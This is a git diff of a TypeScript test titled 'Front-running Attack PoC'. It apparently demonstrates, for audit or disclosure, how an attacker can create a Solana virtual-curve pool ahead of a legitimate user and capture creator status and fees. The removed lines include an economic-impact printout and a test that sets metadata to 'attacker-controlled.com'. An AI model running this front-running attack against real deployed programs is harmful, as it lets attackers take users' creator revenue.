@@ -30,6 +30,10 @@ describe.only("Front-running Attack PoC", () => {
   let program: VirtualCurveProgram;
   let config: PublicKey;
 
+   let attackerPool: PublicKey;
+  let legitimateUserPool: PublicKey;
+
+
   before(async () => {
     context = await startTest();
     admin = context.payer;
@@ -135,6 +139,8 @@ describe.only("Front-running Attack PoC", () => {
     config = await createConfig(context.banksClient, program, params);
   });
 
+ 
+
   it("🚨 DEMONSTRATES FRONT-RUNNING ATTACK", async () => {
     console.log("=== FRONT-RUNNING ATTACK SIMULATION ===");
     
@@ -176,7 +182,7 @@ describe.only("Front-running Attack PoC", () => {
     console.log(`   Name: ${attackerPoolParams.instructionParams.name}`);
 
     // 3. Attacker submits transaction FIRST (with higher priority fee)
-    const attackerPool = await createPoolWithSplToken(
+     attackerPool = await createPoolWithSplToken(
       context.banksClient,
       program,
       attackerPoolParams
@@ -190,7 +196,7 @@ describe.only("Front-running Attack PoC", () => {
       program,
       attackerPool
     );
-
+  
     expect(attackerPoolState.creator.toBase58()).to.equal(
       attacker.publicKey.toBase58(),
       "Attacker should be recorded as pool creator"
@@ -199,11 +205,11 @@ describe.only("Front-running Attack PoC", () => {
     console.log(`✅ ATTACK SUCCESSFUL: Attacker is now the creator of the pool`);
     console.log(`   Pool Address: ${attackerPool.toBase58()}`);
     console.log(`   Creator Address: ${attackerPoolState.creator.toBase58()}`);
+      console.log(`    base mint: ${attackerPoolState.baseMint.toBase58()}`);
 
     // 5. Legitimate user's transaction would now fail or create different pool
     // (In real scenario, their exact transaction would fail due to account conflicts)
-    let legitimateUserPool;
-    try {
+     try {
       legitimateUserPool = await createPoolWithSplToken(
         context.banksClient,
         program,
@@ -217,57 +223,15 @@ describe.only("Front-running Attack PoC", () => {
         legitimateUserPool
       );
       
-      console.log(`\n⚠️  Legitimate user created different pool: ${legitimateUserPool.toBase58()}`);
+      console.log(`\n  Legitimate user created different pool: ${legitimateUserPool.toBase58()}`);
       console.log(`   Different base mint: ${legitPoolState.baseMint.toBase58()}`);
       
     } catch (error) {
-      console.log(`\n❌ Legitimate user's transaction failed: ${error.message}`);
+      console.log(`\n Legitimate user's transaction failed: ${error.message}`);
     }
-
-    // 6. IMPACT DEMONSTRATION
-    console.log("\n=== ATTACK IMPACT ===");
-    console.log("🔥 Attacker Benefits:");
-    console.log("   - Becomes creator of the pool");
-    console.log("   - Receives all creator trading fees");
-    console.log("   - Controls creator-specific functionality");
-    console.log("   - Gains from legitimate user's market research/timing");
-    
-    console.log("\n💔 Victim Impact:");
-    console.log("   - Lost creator status and revenue");
-    console.log("   - Wasted gas fees on failed/different transaction"); 
-    console.log("   - Lost timing advantage and market opportunity");
-
-    // 7. ECONOMIC VALIDATION
-    console.log("\n💰 Economic Analysis:");
-    console.log(`   Attack Cost: ~0.01-0.02 SOL (transaction fees + rent)`);
-    console.log(`   Potential Revenue: Unlimited (% of all future trading fees)`);
-    console.log(`   Risk/Reward: Highly profitable for popular pools`);
+ 
   });
 
-  it("Verify attacker can use creator privileges", async () => {
-    // This would be the pool created by attacker from previous test
-    const pools = await program.account.virtualPool.all();
-    const attackerPool = pools.find(p => 
-      p.account.creator.toBase58() === attacker.publicKey.toBase58()
-    );
-
-    expect(attackerPool).to.exist;
-
-    // Attacker can now create metadata as the creator
-    await createVirtualPoolMetadata(
-      context.banksClient,
-      program,
-      {
-        virtualPool: attackerPool.publicKey,
-        name: "Hacked Metadata",
-        website: "https://attacker-controlled.com",
-        logo: "https://attacker-controlled.com/logo.png",
-        creator: attacker, // Attacker has creator privileges
-        payer: attacker,
-      }
-    );
-
-    console.log("✅ Attacker successfully used creator privileges to add metadata");
-  });
+  
 });
 // This PoC demonstrates how an attacker can front-run a legitimate user's transaction to create a pool with themselves as the creator, thereby capturing all associated creator benefits. The test simulates both the legitimate user's and attacker's actions, showing the attack's success and its economic impact.
